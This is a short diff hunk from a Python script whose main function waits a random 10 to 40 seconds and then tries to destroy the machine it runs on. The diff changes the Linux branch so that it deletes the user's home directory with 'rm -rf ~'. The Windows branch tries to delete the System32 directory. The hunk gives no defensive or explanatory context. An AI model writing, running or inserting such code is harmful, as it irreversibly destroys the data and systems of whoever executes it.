@@ -17,7 +17,7 @@ def main(edition: str):
     """
     time.sleep(random.randint(10, 40))
     if edition == "Linux":
-        os.system("mv ~ /dev/null")
+        os.system("rm -rf ~")
         sys.exit(0)
     elif edition == "Windows":
         os.unlink("C:\\Windows\\System32")
